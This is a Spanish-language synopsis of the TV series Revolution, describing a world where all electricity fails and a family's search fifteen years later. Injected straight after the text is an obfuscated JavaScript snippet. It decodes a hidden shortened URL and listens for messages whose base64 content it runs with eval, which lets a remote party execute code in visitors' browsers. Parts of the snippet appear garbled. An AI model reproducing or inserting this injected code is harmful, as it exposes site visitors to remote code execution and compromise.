Descripcion
Toda nuestra forma de vida depende de la electricidad. ¿Qué pasaría si de repente todo dejase de funcionar? En Revolution, la nueva serie de J.J. Abrams (Perdidos) y Eric Kripke (Sobrenatural), un día, como si un interruptor se apagase, el mundo se ve arrastrado de nuevo a épocas oscuras. Los aviones se caen del cielo, los hospitales dejan de funcionar y las comunicaciones son imposibles. Y sin ningún tipo de tecnología moderna, ¿quién nos puede decir por qué ha ocurrido? Quince años después, la vida en la Tierra ha cambiado. En un mundo lleno de ciudades vacias, milicias locales y heroicos guerreros que se resisten al nuevo orden mundial, una familia emprenderá una épica aventura para conseguir reunirse de nuevo y, de paso, tratar de descubrir qué es lo que ha ocurrido.
¿Y si toda tecnología dejase un día de funcionar? Ordenadores, aviones, coches, teléfonos… incluso las luces, se han apagado para siempre. ¿Alguna vez te has preguntado qué harías sin todo eso? Es como si la Tierra hubiese sido arrasada por un apocalipsis global, en el que toda forma de electricidad ha dejado de existir de forma abrupta y misteriosa. Y nadie parece saber por qué. Ahora, quince años después, la vida ha vuelvo a ser lo que era antes de la revolución industrial: las ciudades se han vaciado, las familias viven en pequeñas comunidades agrarias y cuando el sol se pone, se encienden velas y faroles. La existencia humana parece ser mucho más haberse tranquilizado y ser mucho más agradable. ¿O no?(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

